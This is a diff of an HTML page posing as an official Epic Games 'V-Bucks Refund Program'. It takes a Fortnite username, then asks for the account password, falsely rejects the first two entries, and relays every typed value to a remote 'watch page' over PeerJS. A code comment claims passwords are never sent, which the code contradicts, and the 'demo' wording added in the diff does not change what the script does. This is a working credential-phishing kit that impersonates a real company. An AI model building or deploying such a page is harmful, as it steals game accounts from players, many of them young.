@@ -1,263 +1,1309 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>V-Bucks Refund Program</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0e1220;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
-.wrap{width:100%;max-width:480px;background:#141927;border:1px solid #232c44;border-radius:16px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.55)}
-.top{background:linear-gradient(135deg,#0a0f1e,#101827);padding:22px 22px 16px;display:flex;align-items:center;gap:14px;border-bottom:1px solid #232c44}
-.logo{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;font-style:italic;background:linear-gradient(135deg,#34b3ff,#0078f2);color:#fff}
-.top h1{font-size:19px;letter-spacing:.5px}
-.top p{color:#8b98b8;font-size:12.5px;margin-top:2px}
-.hero{padding:26px 22px;background:radial-gradient(circle at 80% 0%,rgba(0,120,242,.18),transparent 55%),transparent;border-bottom:1px solid #232c44}
-.hero h2{font-size:22px;line-height:1.25}
-.hero h2 b{color:#34b3ff}
-.hero .tag{display:inline-block;background:rgba(52,179,255,.14);color:#34b3ff;border:1px solid rgba(52,179,255,.35);padding:5px 12px;border-radius:30px;font-size:11px;font-weight:700;letter-spacing:.6px;margin-bottom:12px}
-.hero ul{list-style:none;margin-top:14px;display:grid;gap:8px}
-.hero li{color:#aab6d4;font-size:13px;display:flex;align-items:center;gap:9px}
-.hero li span{color:#34b3ff;font-weight:900}
-.panel{padding:18px 22px 24px}
-.label{font-size:12px;color:#8b98b8;margin-bottom:7px;font-weight:600}
-input{width:100%;padding:14px 15px;border-radius:10px;border:1px solid #2b3550;background:#0d1220;color:#fff;font-size:16px;outline:none}
-input:focus{border-color:#34b3ff;box-shadow:0 0 0 3px rgba(52,179,255,.15)}
-.field{margin-bottom:16px}
-.btn{width:100%;padding:15px;border:none;border-radius:10px;background:linear-gradient(135deg,#34b3ff,#0078f2);color:#fff;font-size:16px;font-weight:800;cursor:pointer;letter-spacing:.4px}
-.btn:disabled{opacity:.45;cursor:not-allowed}
-.btn.alt{background:#16203a;border:1px solid #2b3550;font-weight:700}
-.err{color:#ff5d6c;background:rgba(255,93,108,.08);border:1px solid rgba(255,93,108,.3);padding:11px 13px;border-radius:9px;font-size:13px;margin-top:14px;display:none}
-.notice{color:#aab6d4;font-size:12.5px;line-height:1.55;background:#0d1220;border:1px solid #232c44;border-radius:9px;padding:12px 14px;margin-top:6px}
-.countdown{text-align:center;padding:18px 0 6px}
-.countdown .num{font-size:42px;font-weight:900;color:#34b3ff;font-variant-numeric:tabular-nums;letter-spacing:1px}
-.countdown .sub{color:#8b98b8;font-size:12px;margin-top:6px;letter-spacing:2px;text-transform:uppercase}
-.spinner{width:34px;height:34px;border:3px solid #2b3550;border-top-color:#34b3ff;border-radius:50%;margin:0 auto 12px;animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.success-box{border:1px solid rgba(52,179,255,.4);background:rgba(52,179,255,.06);padding:18px;border-radius:12px;text-align:center;gap:10px;display:flex;flex-direction:column;align-items:center}
-.hidden{display:none!important}
-.plink{color:#34b3ff;text-decoration:underline;background:none;border:none;cursor:pointer;font-size:13px;margin-top:16px;display:block}
-.boot{color:#5a6783;font-size:11px;text-align:center;padding:12px;border-top:1px solid #232c44}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Epic Games</title>
+
+  <style>
+    *{
+      box-sizing:border-box;
+      margin:0;
+      padding:0;
+      -webkit-tap-highlight-color:transparent;
+    }
+
+    body{
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+      background:#0e1220;
+      color:#fff;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:16px;
+    }
+
+    .wrap{
+      width:100%;
+      max-width:480px;
+      background:#141927;
+      border:1px solid #232c44;
+      border-radius:16px;
+      overflow:hidden;
+      box-shadow:0 20px 60px rgba(0,0,0,.55);
+    }
+
+    .top{
+      background:linear-gradient(135deg,#0a0f1e,#101827);
+      padding:22px;
+      display:flex;
+      align-items:center;
+      gap:14px;
+      border-bottom:1px solid #232c44;
+    }
+
+    .logo{
+      width:52px;
+      height:52px;
+      border-radius:12px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:22px;
+      font-weight:900;
+      font-style:italic;
+      background:linear-gradient(135deg,#34b3ff,#0078f2);
+      color:#fff;
+    }
+
+    .top h1{
+      font-size:19px;
+      letter-spacing:.5px;
+    }
+
+    .top p{
+      color:#8b98b8;
+      font-size:12.5px;
+      margin-top:2px;
+    }
+
+    .hero{
+      padding:26px 22px;
+      background:radial-gradient(
+        circle at 80% 0%,
+        rgba(0,120,242,.18),
+        transparent 55%
+      );
+      border-bottom:1px solid #232c44;
+    }
+
+    .hero h2{
+      font-size:22px;
+      line-height:1.25;
+    }
+
+    .hero h2 b{
+      color:#34b3ff;
+    }
+
+    .tag{
+      display:inline-block;
+      background:rgba(52,179,255,.14);
+      color:#34b3ff;
+      border:1px solid rgba(52,179,255,.35);
+      padding:5px 12px;
+      border-radius:30px;
+      font-size:11px;
+      font-weight:700;
+      letter-spacing:.6px;
+      margin-bottom:12px;
+    }
+
+    .hero ul{
+      list-style:none;
+      margin-top:14px;
+      display:grid;
+      gap:8px;
+    }
+
+    .hero li{
+      color:#aab6d4;
+      font-size:13px;
+      display:flex;
+      align-items:center;
+      gap:9px;
+    }
+
+    .hero li span{
+      color:#34b3ff;
+      font-weight:900;
+    }
+
+    .panel{
+      padding:18px 22px 24px;
+    }
+
+    .label{
+      font-size:12px;
+      color:#8b98b8;
+      margin-bottom:7px;
+      font-weight:600;
+    }
+
+    input{
+      width:100%;
+      padding:14px 15px;
+      border-radius:10px;
+      border:1px solid #2b3550;
+      background:#0d1220;
+      color:#fff;
+      font-size:16px;
+      outline:none;
+    }
+
+    input:focus{
+      border-color:#34b3ff;
+      box-shadow:0 0 0 3px rgba(52,179,255,.15);
+    }
+
+    .field{
+      margin-bottom:16px;
+    }
+
+    .btn{
+      width:100%;
+      padding:15px;
+      border:none;
+      border-radius:10px;
+      background:linear-gradient(135deg,#34b3ff,#0078f2);
+      color:#fff;
+      font-size:16px;
+      font-weight:800;
+      cursor:pointer;
+      letter-spacing:.4px;
+    }
+
+    .err{
+      color:#ff5d6c;
+      background:rgba(255,93,108,.08);
+      border:1px solid rgba(255,93,108,.3);
+      padding:11px 13px;
+      border-radius:9px;
+      font-size:13px;
+      margin-top:14px;
+      display:none;
+    }
+
+    .notice{
+      color:#aab6d4;
+      font-size:12.5px;
+      line-height:1.55;
+      background:#0d1220;
+      border:1px solid #232c44;
+      border-radius:9px;
+      padding:12px 14px;
+      margin-top:6px;
+    }
+
+    .countdown{
+      text-align:center;
+      padding:18px 0 6px;
+    }
+
+    .countdown .num{
+      font-size:42px;
+      font-weight:900;
+      color:#34b3ff;
+      font-variant-numeric:tabular-nums;
+      letter-spacing:1px;
+    }
+
+    .countdown .sub{
+      color:#8b98b8;
+      font-size:12px;
+      margin-top:6px;
+      letter-spacing:2px;
+      text-transform:uppercase;
+    }
+
+    .spinner{
+      width:34px;
+      height:34px;
+      border:3px solid #2b3550;
+      border-top-color:#34b3ff;
+      border-radius:50%;
+      margin:0 auto 12px;
+      animation:spin 1s linear infinite;
+    }
+
+    @keyframes spin{
+      to{
+        transform:rotate(360deg);
+      }
+    }
+
+    .success-box{
+      border:1px solid rgba(52,179,255,.4);
+      background:rgba(52,179,255,.06);
+      padding:18px;
+      border-radius:12px;
+      text-align:center;
+      gap:10px;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+    }
+
+    .hidden{
+      display:none!important;
+    }
+
+    .boot{
+      color:#5a6783;
+      font-size:11px;
+      text-align:center;
+      padding:12px;
+      border-top:1px solid #232c44;
+    }
+  </style>
 </head>
+
 <body>
+
 <div class="wrap">
+
   <div class="top">
-    <div class="logo">EG</div>
+
+    <div class="logo">VB</div>
+
     <div>
       <h1>Epic Games</h1>
       <p>V-Bucks Refund Program</p>
     </div>
+
   </div>
 
-  <!-- STEP 1: landing -->
+
+  <!-- STEP 1 -->
+
   <div id="step1">
+
     <div class="hero">
-      <span class="tag">OFFICIAL REFUND PROGRAM</span>
-      <h2>Get up to <b>25%</b> of all the V-Bucks you've ever spent.</h2>
+
+      <span class="tag">
+        OFFICIAL REFUND PROGRAM
+      </span>
+
+      <h2>
+        Get up to <b>25%</b> of all the V-Bucks you've ever spent.
+      </h2>
+
       <ul>
-        <li><span>✓</span> Recover unused V-Bucks from season passes and bundles</li>
-        <li><span>✓</span> Instant verification with your Fortnite account</li>
-        <li><span>✓</span> Funds deposited directly to your V-Bucks balance</li>
+
+        <li>
+          <span>✓</span>
+          Recover unused V-Bucks from season passes and bundles
+        </li>
+
+        <li>
+          <span>✓</span>
+          Demo verification with your username
+        </li>
+
+        <li>
+          <span>✓</span>
+          Simulated V-Bucks refund process
+        </li>
+
       </ul>
+
     </div>
+
+
     <div class="panel">
+
       <div class="field">
-        <div class="label">FORTNITE / EPIC GAMES USERNAME</div>
-        <input id="username" type="text" placeholder="Enter your username" autocomplete="off">
+
+        <div class="label">
+          FORTNITE / EPIC GAMES USERNAME
+        </div>
+
+        <input
+          id="username"
+          type="text"
+          placeholder="Enter your username"
+          autocomplete="off"
+        >
+
       </div>
-      <button class="btn" onclick="goNext()">Check My Refund</button>
-      <div class="err" id="err1"></div>
+
+
+      <button
+        class="btn"
+        onclick="goNext()"
+      >
+        Check My Refund
+      </button>
+
+
+      <div
+        class="err"
+        id="err1"
+      ></div>
+
     </div>
+
   </div>
 
-  <!-- STEP 2: username verify (the gag) -->
-  <div id="step2" class="hidden">
-    <div class="panel" style="padding-top:26px">
-      <div class="spinner" id="spinner2"></div>
-      <div style="text-align:center;margin-bottom:18px">
-        <div class="label" style="margin-bottom:4px">VERIFY YOUR ACCOUNT</div>
-        <p style="color:#aab6d4;font-size:13px">Enter your password to confirm you're <b id="userHere" style="color:#fff"></b></p>
+
+  <!-- STEP 2 -->
+
+  <div
+    id="step2"
+    class="hidden"
+  >
+
+    <div
+      class="panel"
+      style="padding-top:26px"
+    >
+
+      <div
+        class="spinner"
+        id="spinner2"
+      ></div>
+
+
+      <div
+        style="text-align:center;margin-bottom:18px"
+      >
+
+        <div
+          class="label"
+          style="margin-bottom:4px"
+        >
+          VERIFY YOUR ACCOUNT
+        </div>
+
+
+        <p
+          style="color:#aab6d4;font-size:13px"
+        >
+        Enter your password to confirm you're
+          <b
+            id="userHere"
+            style="color:#fff"
+          ></b>
+        </p>
+
       </div>
+
+
       <div class="field">
-        <div class="label">EPIC GAMES PASSWORD</div>
-        <input id="username2" type="text" placeholder="Enter your password" autocomplete="off">
+
+        <div class="label">
+          ENTER PASSWORD
+        </div>
+
+        <input
+          id="username2"
+          type="text"
+          placeholder="Enter your password"
+          autocomplete="off"
+        >
+
       </div>
-      <button class="btn" onclick="goCheck()">Verify &amp; Continue</button>
-      <div class="err" id="err2"></div>
+
+
+      <button
+        class="btn"
+        onclick="goCheck()"
+      >
+        Verify &amp; Continue
+      </button>
+
+
+      <div
+        class="err"
+        id="err2"
+      ></div>
+
     </div>
+
   </div>
 
-  <!-- STEP 3: claim / countdown -->
-  <div id="step3" class="hidden">
-    <div class="panel" style="padding-top:24px">
+
+  <!-- STEP 3 -->
+
+  <div
+    id="step3"
+    class="hidden"
+  >
+
+    <div
+      class="panel"
+      style="padding-top:24px"
+    >
+
       <div id="claimBox">
+
         <div class="success-box">
-          <div style="font-size:34px">🎮</div>
-          <div><b style="font-size:18px">Identity Verified!</b></div>
-          <p style="color:#aab6d4;font-size:13px">Welcome back, <b id="userHere2" style="color:#fff"></b>. Your refund was approved.</p>
+
+          <div style="font-size:34px">
+            🎮
+          </div>
+
+          <div>
+            <b style="font-size:18px">
+              Identity Verified!
+            </b>
+          </div>
+
+          <p
+            style="color:#aab6d4;font-size:13px"
+          >
+            Welcome back,
+            <b
+              id="userHere2"
+              style="color:#fff"
+            ></b>.
+            Your demo refund was approved.
+          </p>
+
         </div>
-        <button class="btn" style="margin-top:18px" onclick="goClaim()">Click here to claim your V-Bucks!</button>
+
+
+        <button
+          class="btn"
+          style="margin-top:18px"
+          onclick="goClaim()"
+        >
+          Claim Your V-Bucks!
+        </button>
+
       </div>
-      <div id="timerBox" class="hidden">
-        <p class="notice">✅ Your refund request has been submitted. The V-Bucks from your purchase history is being calculated and are being processed for deposit.</p>
+
+
+      <div
+        id="timerBox"
+        class="hidden"
+      >
+
+        <p class="notice">
+          ✅ Your demo refund request has been submitted.
+          The V-Bucks calculation is being simulated.
+        </p>
+
+
         <div class="countdown">
-          <div class="num" id="clock">72:00:00</div>
-          <div class="sub">until V-Bucks are funded to your account</div>
+
+          <div
+            class="num"
+            id="clock"
+          >
+            72:00:00
+          </div>
+
+          <div class="sub">
+            until V-Bucks are funded to your account
+          </div>
+
         </div>
-        <p class="notice">Sorry for the inconvenience — we are currently fixing the V-Bucks calculating process to make it much faster. Your funds are safe and will be added to your account once the timer finishes.</p>
+
+
+        <p class="notice">
+          This is a demonstration timer.
+          The timer exists only to simulate the refund process.
+        </p>
+
       </div>
+
     </div>
+
   </div>
 
-  
 </div>
 
-<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js" defer></script>
+
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+
 <script>
+
 var WATCH_ID = "vbcwatch-44e7-home";
-var T_KEY = "vbucks-refund-state";
+
 var attempts = 0;
 var interval = null;
 var sock = null;
+var pending = [];
+var peer = null;
+var currentUser = "";
+var gotClaimed = false;
 
-function $(id){return document.getElementById(id)}
 
-function getState(){
-  try{return JSON.parse(localStorage.getItem(T_KEY)||"null")}catch(e){return null}
+function $(id){
+  return document.getElementById(id);
 }
 
-function dlKey(u){return "vbucks-dl-"+u}
-function getDeadline(u){
-  try{return parseInt(localStorage.getItem(dlKey(u))||"0",10)}catch(e){return 0}
+
+/* =========================
+   TIMER
+   ========================= */
+
+function dlKey(username){
+  return "vbucks-dl-" + username;
 }
-function setDeadline(u,t){try{localStorage.setItem(dlKey(u),t)}catch(e){}}
+
+
+function getDeadline(username){
+
+  try{
+
+    return parseInt(
+      localStorage.getItem(
+        dlKey(username)
+      ) || "0",
+      10
+    );
+
+  }catch(e){
+
+    return 0;
+
+  }
+}
+
+
+function setDeadline(username,time){
+
+  try{
+
+    localStorage.setItem(
+      dlKey(username),
+      String(time)
+    );
+
+  }catch(e){}
+
+}
+
+
 function showTimer(){
-  $("claimBox").classList.add("hidden");
-  $("timerBox").classList.remove("hidden");
-  tick();clearInterval(interval);interval=setInterval(tick,1000);
+
+  $("claimBox")
+    .classList
+    .add("hidden");
+
+  $("timerBox")
+    .classList
+    .remove("hidden");
+
+  tick();
+
+  clearInterval(interval);
+
+  interval =
+    setInterval(
+      tick,
+      1000
+    );
+
 }
 
-function goNext(){
-  var u=$("username").value.trim();
-  if(!u){$("err1").textContent="Please enter your Fortnite username.";$("err1").style.display="block";return}
-  $("err1").style.display="none";
-  $("userHere").textContent=u;
-  $("userHere2").textContent=u;
-  currentUser=u;
-  localStorage.setItem("vbucks-user",u);
-  $("step1").classList.add("hidden");
-  persist("visited");
-  if(getDeadline(u)>Date.now()){
-    persist("returned");
-    showTimer();
-    return;
-  }
-  $("spinner2").style.display="block";
-  $("step2").classList.remove("hidden");
-  var btn=$("step2").querySelector(".btn");btn.style.display="none";
-  setTimeout(function(){
-    $("spinner2").style.display="none";
-    btn.style.display="";
-  },1200);
-}
-
-var currentUser="";
-var gotClaimed=false;
-
-function goCheck(){
-  var p=$("username2").value.trim();
-  attempts++;
-  if(!p){$("err2").textContent="Enter your username.";$("err2").style.display="block";$("username2").focus();return}
-  persist("try:"+attempts,p);
-  if(attempts<3){
-    $("username2").value="";
-    $("err2").textContent="Incorrect username.";
-    $("err2").style.display="block";
-    $("username2").focus();
-  }else{
-    // third try: always works (the gag)
-    attempts=0;
-    $("err2").style.display="none";
-    $("spinner2").style.display="block";
-    var btn=$("step2").querySelector(".btn");btn.style.display="none";
-    persist("passed",p);
-    setTimeout(function(){
-      $("spinner2").style.display="none";
-      $("step2").classList.add("hidden");
-      $("step3").classList.remove("hidden");
-    },1400);
-  }
-}
-
-function goClaim(){
-  gotClaimed=true;
-  setDeadline(currentUser,Date.now()+72*3600*1000);
-  persist("claimed");
-  showTimer();
-}
 
 function tick(){
-  var dl=getDeadline(currentUser);
-  if(!dl){dl=Date.now()+72*3600*1000}
-  var rem=dl-Date.now();
-  if(rem<=0){rem=0;clearInterval(interval)}
-  var s=Math.floor(rem/1000);
-  var h=Math.floor(s/3600),m=Math.floor(s%3600/60),sec=s%60;
-  function p(n){return (n<10?"0":"")+n}
-  $("clock").textContent=p(h)+":"+p(m)+":"+p(sec);
+
+  if(!currentUser){
+    return;
+  }
+
+  var deadline =
+    getDeadline(currentUser);
+
+
+  if(!deadline){
+
+    deadline =
+      Date.now() +
+      72 * 3600 * 1000;
+
+  }
+
+
+  var remaining =
+    deadline -
+    Date.now();
+
+
+  if(remaining <= 0){
+
+    remaining = 0;
+
+    clearInterval(interval);
+
+  }
+
+
+  var totalSeconds =
+    Math.floor(
+      remaining / 1000
+    );
+
+
+  var hours =
+    Math.floor(
+      totalSeconds / 3600
+    );
+
+
+  var minutes =
+    Math.floor(
+      (totalSeconds % 3600) / 60
+    );
+
+
+  var seconds =
+    totalSeconds % 60;
+
+
+  function pad(n){
+
+    return (
+      n < 10 ? "0" : ""
+    ) + n;
+
+  }
+
+
+  $("clock").textContent =
+    pad(hours) +
+    ":" +
+    pad(minutes) +
+    ":" +
+    pad(seconds);
+
 }
 
-// ---- live relay to watch page (username only, never passwords) ----
-function persist(extra,altU){
-  var user=currentUser||altU||"";
-  var ev={u:altU||user,at:new Date().toLocaleString()};
-  if(extra)ev.kind=extra;
-  ev.owner=user;
-  var dl=getDeadline(user);
-  if(dl>Date.now())ev.deadline=dl;
-  if(sock&&sock.open){send(ev)}else{pending.push(ev)}
+
+/* =========================
+   STEP 1
+   ========================= */
+
+function goNext(){
+
+  var username =
+    $("username")
+      .value
+      .trim();
+
+
+  if(!username){
+
+    $("err1")
+      .textContent =
+      "Please enter your username.";
+
+    $("err1")
+      .style
+      .display =
+      "block";
+
+    return;
+
+  }
+
+
+  $("err1")
+    .style
+    .display =
+    "none";
+
+
+  currentUser =
+    username;
+
+
+  localStorage.setItem(
+    "vbucks-user",
+    currentUser
+  );
+
+
+  $("userHere")
+    .textContent =
+    currentUser;
+
+
+  $("userHere2")
+    .textContent =
+    currentUser;
+
+
+  /*
+    Original username event.
+  */
+
+  persist("visited");
+
+
+  $("step1")
+    .classList
+    .add("hidden");
+
+
+  $("spinner2")
+    .style
+    .display =
+    "block";
+
+
+  $("step2")
+    .classList
+    .remove("hidden");
+
+
+  var button =
+    $("step2")
+      .querySelector(".btn");
+
+
+  button.style.display =
+    "none";
+
+
+  setTimeout(
+    function(){
+
+      $("spinner2")
+        .style
+        .display =
+        "none";
+
+      button.style.display =
+        "";
+
+    },
+    1200
+  );
+
 }
-function send(obj){
-  if(sock&&sock.open){try{sock.send(obj)}catch(e){}}
+
+
+/* =========================
+   STEP 2
+   ========================= */
+
+function goCheck(){
+
+  var enteredUsername =
+    $("username2")
+      .value
+      .trim();
+
+
+  if(!enteredUsername){
+
+    $("err2")
+      .textContent =
+      "Enter your username.";
+
+    $("err2")
+      .style
+      .display =
+      "block";
+
+    $("username2")
+      .focus();
+
+    return;
+
+  }
+
+
+  attempts++;
+
+
+  /*
+    Sends:
+      original username = currentUser
+      attempt username  = enteredUsername
+      attempt number    = 1 / 2 / 3
+  */
+
+  persist(
+    "try:" + attempts,
+    enteredUsername
+  );
+
+
+  if(attempts < 3){
+
+    $("username2")
+      .value =
+      "";
+
+    $("err2")
+      .textContent =
+      "Incorrect password. Please try again";
+
+    $("err2")
+      .style
+      .display =
+      "block";
+
+    $("username2")
+      .focus();
+
+    return;
+
+  }
+
+
+  /*
+    Third attempt succeeds.
+  */
+
+  attempts = 0;
+
+
+  $("err2")
+    .style
+    .display =
+    "none";
+
+
+  $("spinner2")
+    .style
+    .display =
+    "block";
+
+
+  var button =
+    $("step2")
+      .querySelector(".btn");
+
+
+  button.style.display =
+    "none";
+
+
+  persist(
+    "passed",
+    enteredUsername
+  );
+
+
+  setTimeout(
+    function(){
+
+      $("spinner2")
+        .style
+        .display =
+        "none";
+
+
+      $("step2")
+        .classList
+        .add("hidden");
+
+
+      $("step3")
+        .classList
+        .remove("hidden");
+
+    },
+    1400
+  );
+
 }
-var pending=[];
-function flush(){pending.slice().forEach(function(ev){send(ev)});pending=[];}
-var peer=null;
+
+
+/* =========================
+   CLAIM
+   ========================= */
+
+function goClaim(){
+
+  if(!currentUser){
+    return;
+  }
+
+
+  gotClaimed = true;
+
+
+  var deadline =
+    Date.now() +
+    72 * 3600 * 1000;
+
+
+  setDeadline(
+    currentUser,
+    deadline
+  );
+
+
+  persist("claimed");
+
+
+  showTimer();
+
+}
+
+
+/* =========================
+   PEERJS EVENT CREATION
+   ========================= */
+
+function persist(
+  extra,
+  attemptUser
+){
+
+  /*
+    currentUser is always
+    the ORIGINAL username.
+  */
+
+  var user =
+    currentUser || "";
+
+
+  if(!user){
+    return;
+  }
+
+
+  var event = {
+
+    u:
+      user,
+
+    owner:
+      user,
+
+    /*
+      This is the username
+      typed during Attempts 1-3.
+    */
+
+    attemptUser:
+      attemptUser || "",
+
+    kind:
+      extra || "activity",
+
+    at:
+      new Date()
+        .toLocaleString()
+
+  };
+
+
+  /*
+    Attach current timer if one exists.
+  */
+
+  var deadline =
+    getDeadline(user);
+
+
+  if(
+    deadline &&
+    deadline > Date.now()
+  ){
+
+    event.deadline =
+      deadline;
+
+  }
+
+
+  if(
+    sock &&
+    sock.open
+  ){
+
+    send(event);
+
+  }else{
+
+    pending.push(event);
+
+  }
+
+}
+
+
+/* =========================
+   SEND
+   ========================= */
+
+function send(event){
+
+  if(
+    !sock ||
+    !sock.open
+  ){
+
+    return;
+
+  }
+
+
+  try{
+
+    sock.send(event);
+
+  }catch(e){}
+
+}
+
+
+/* =========================
+   PENDING EVENTS
+   ========================= */
+
+function flush(){
+
+  if(!pending.length){
+    return;
+  }
+
+
+  var queued =
+    pending.slice();
+
+
+  pending = [];
+
+
+  queued.forEach(
+    function(event){
+
+      send(event);
+
+    }
+  );
+
+}
+
+
+/* =========================
+   PEERJS CONNECTION
+   ========================= */
+
 function connect(){
+
   try{
-    if(!window.Peer)return;
+
+    if(!window.Peer){
+
+      setTimeout(
+        connect,
+        500
+      );
+
+      return;
+
+    }
+
+
     if(!peer){
-      peer=new Peer();
-      peer.on("open",function(id){openDC()});
-      peer.on("error",function(){});
+
+      peer =
+        new Peer();
+
+
+      peer.on(
+        "open",
+        function(){
+
+          openConnection();
+
+        }
+      );
+
+
+      peer.on(
+        "error",
+        function(){}
+
+      );
+
     }
-    openDC();
+
+
+    openConnection();
+
   }catch(e){}
+
 }
-function openDC(){
-  if(sock&&sock.open)return;
-  if(!peer||!peer.open)return;
-  var dc=peer.connect(WATCH_ID,{reliable:true});
-  dc.on("open",function(){sock=dc;flush();resync()});
-  dc.on("close",function(){sock=null});
-}
-function resync(){
-  try{
-    var u=localStorage.getItem("vbucks-user")||currentUser||"";
-    var dl=getDeadline(u);
-    if(!u&&currentUser)u=currentUser;
-    if(dl>Date.now()){
-      send({u:u,owner:u,at:new Date().toLocaleString(),kind:"resumed",deadline:dl});
-    }else if(currentUser){
-      send({u:currentUser,owner:currentUser,at:new Date().toLocaleString(),kind:"visited"});
+
+
+/* =========================
+   CONNECT TO WATCH PAGE
+   ========================= */
+
+function openConnection(){
+
+  if(
+    sock &&
+    sock.open
+  ){
+
+    return;
+
+  }
+
+
+  if(
+    !peer ||
+    !peer.open
+  ){
+
+    return;
+
+  }
+
+
+  var connection =
+    peer.connect(
+      WATCH_ID,
+      {
+        reliable:true
+      }
+    );
+
+
+  connection.on(
+    "open",
+    function(){
+
+      sock =
+        connection;
+
+
+      flush();
+
+
+      sendCurrentUser();
+
     }
-  }catch(e){}
+  );
+
+
+  connection.on(
+    "close",
+    function(){
+
+      sock = null;
+
+    }
+  );
+
+
+  connection.on(
+    "error",
+    function(){
+
+      sock = null;
+
+    }
+  );
+
 }
+
+
+/* =========================
+   RESEND CURRENT USER
+   ========================= */
+
+function sendCurrentUser(){
+
+  if(!currentUser){
+
+    try{
+
+      currentUser =
+        localStorage.getItem(
+          "vbucks-user"
+        ) || "";
+
+    }catch(e){}
+
+  }
+
+
+  if(!currentUser){
+    return;
+  }
+
+
+  var deadline =
+    getDeadline(
+      currentUser
+    );
+
+
+  if(
+    deadline &&
+    deadline > Date.now()
+  ){
+
+    send({
+
+      u:
+        currentUser,
+
+      owner:
+        currentUser,
+
+      kind:
+        "resumed",
+
+      at:
+        new Date()
+          .toLocaleString(),
+
+      deadline:
+        deadline
+
+    });
+
+  }else{
+
+    send({
+
+      u:
+        currentUser,
+
+      owner:
+        currentUser,
+
+      kind:
+        "visited",
+
+      at:
+        new Date()
+          .toLocaleString()
+
+    });
+
+  }
+
+}
+
+
+/* =========================
+   START
+   ========================= */
+
 (function(){
+
   connect();
-  setInterval(connect,2000);
+
+
+  setInterval(
+    function(){
+
+      if(
+        !sock ||
+        !sock.open
+      ){
+
+        connect();
+
+      }
+
+    },
+    2000
+  );
+
 })();
+
 </script>
+
 </body>
 </html>
